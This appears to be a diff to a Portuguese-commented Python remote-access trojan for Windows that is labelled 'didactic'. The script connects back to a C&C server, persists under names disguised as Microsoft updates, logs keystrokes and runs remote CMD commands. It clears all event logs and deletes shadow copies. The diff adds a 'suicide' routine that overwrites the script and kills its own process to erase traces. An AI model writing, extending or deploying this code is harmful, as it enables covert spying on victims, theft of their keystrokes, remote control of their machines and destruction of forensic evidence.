@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 """
 Agente didático – persistência, keylogger, limpeza extrema
-AJUSTADO: RETRY_CUR agora é GLOBAL e tratamento de conexão mais robusto
+VERSÃO FINAL: wipe + suicídio + desligamento total
 """
 
 from time import sleep
-import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil
+import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil, signal
 from pathlib import Path
 from ctypes import windll
 from datetime import datetime as dt
@@ -17,10 +17,11 @@ PORT      = 443
 LOG_FILE  = os.path.join(os.getenv("APPDATA"), "svchost.log")
 MUTEX     = "Global\\msupdate42"
 BUF, LOCK = "", threading.Lock()
-RETRY_CUR = 1                # ◀══ CORRIGIDO: escopo global declarado aqui
+RETRY_CUR = 1
 DEBUG     = False
 XOR_KEY   = 0x9F
 EXE_PATH  = os.path.join(os.getenv("APPDATA"), "msupdate.exe")
+WIPE_FLAG = False  # Controle de suicídio
 
 # ------------------------------------------------------------------ #
 #  FUNÇÕES AUXILIARES
@@ -98,7 +99,7 @@ def persist_guardian():
             persist()
 
 # ------------------------------------------------------------------ #
-#  LIMPEZA EXTREMA
+#  LIMPEZA EXTREMA + SUICÍDIO
 # ------------------------------------------------------------------ #
 def overwrite_then_unlink(path: str | Path):
     p = Path(path)
@@ -122,10 +123,18 @@ def cleanup_hardcore():
             winreg.DeleteValue(k, "msupdate")
     except Exception:
         pass
-    # limpa logs e shadows
     ps = 'Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { wevtutil cl $_.LogName }'
     subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True)
     subprocess.run(["vshadow", "-da"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def suicide(delay: int = 3):
+    """Sobrescreve o script original e mata o processo."""
+    sleep(delay)
+    try:
+        overwrite_then_unlink(__file__)
+    except Exception:
+        pass
+    os.kill(os.getpid(), signal.SIGTERM)
 
 # ------------------------------------------------------------------ #
 #  MENU INTERATIVO
@@ -136,12 +145,13 @@ def show_menu(s):
 1 — Visualizar teclas capturadas (keys)
 2 — Executar comando CMD
 3 — Status de persistência
-4 — LIMPAR TUDO (wipe) /SEM RASTRO/
-5 — Sair (manter conexão – menu volta)
+4 — LIMPAR TUDO (wipe/die) /SEM RASTRO/
+5 — Sair
 Escolha (1-5): """
     s.send(menu.encode())
 
 def handle_command(s, cmd: str) -> bool:
+    global WIPE_FLAG
     cmd = cmd.strip()
     if cmd == "1":
         global BUF
@@ -169,13 +179,12 @@ def handle_command(s, cmd: str) -> bool:
                 "PID atual : " + str(os.getpid()) + "\n")
         s.send(info.encode())
         return True
-    elif cmd == "4" or cmd == "/wipe":
-        s.send(b"[+] Iniciando limpeza extrema...\n")
+    elif cmd in ("4", "/wipe", "/die", "exit"):
+        s.send(b"[+] Wipe + shutdown self in 3 s...\n")
         cleanup_hardcore()
-        s.send("[+] Rastros apagados - desconectando.\n".encode())
-        return False
-    elif cmd == "5" or cmd == "exit":
-        s.send("[*] Saindo…\n".encode())
+        s.close()
+        WIPE_FLAG = True
+        threading.Thread(target=lambda: suicide(3), daemon=True).start()
         return False
     else:
         s.send(b"[!] Opcao invalida\n")
@@ -185,30 +194,27 @@ def handle_command(s, cmd: str) -> bool:
 #  CONEXÃO / LOOP PRINCIPAL
 # ------------------------------------------------------------------ #
 def connect_back():
-    """
-    Tenta conectar; usa **RETRY_CUR global** e aumenta até 30 min.
-    Retorna socket conectado ou None se houver erro crítico.
-    """
-    global RETRY_CUR                                     # ◀══  sem isto o UnboundLocalError reaparece
+    global RETRY_CUR
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(10)
             s.connect((IP, PORT))
-            RETRY_CUR = 1                                # reset ao conectar
+            RETRY_CUR = 1
             return s
-        except (socket.timeout, ConnectionRefusedError, OSError):
-            # Aqui GERAMOS o back-off SEM declarar RETRY_CUR local
-            # usamos a variável global declarada lá em cima
+        except Exception:
             log(f"Conexão falhou, re-tentando em {RETRY_CUR}s")
             sleep(RETRY_CUR)
-            RETRY_CUR = min(RETRY_CUR * 2, 1800)       # 30 min max
+            RETRY_CUR = min(RETRY_CUR * 2, 1800)
 
 def main_loop():
-    """Loop eterno: conecta -> menu -> processa -> reconecta."""
+    global WIPE_FLAG
     while True:
         sock = connect_back()
-        if sock is None:               # caso connect_back() retorne None (nunca, mas prevenimos)
+        if WIPE_FLAG:
+            suicide(0)
+            break
+        if sock is None:
             continue
         log("Conectado ao C&C")
         try:
@@ -219,7 +225,7 @@ def main_loop():
                     break
                 if not handle_command(sock, data):
                     break
-        except (socket.error, ConnectionResetError):
+        except Exception:
             pass
         finally:
             try:
@@ -229,17 +235,13 @@ def main_loop():
             log("Desconectado do C&C – reconectando…")
 
 # ------------------------------------------------------------------ #
-#  ENTREDA DO PROGRAMA
+#  ENTRADA DO PROGRAMA
 # ------------------------------------------------------------------ #
 if __name__ == "__main__":
-    # Singleton
     mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
-    if windll.kernel32.GetLastError() == 0xB7:  # já existe
+    if windll.kernel32.GetLastError() == 0xB7:
         sys.exit()
-
-    # Threads de persistência & keylogger
     persist()
     threading.Thread(target=persist_guardian, daemon=True).start()
     threading.Thread(target=start_keylogger, daemon=True).start()
-
     main_loop()
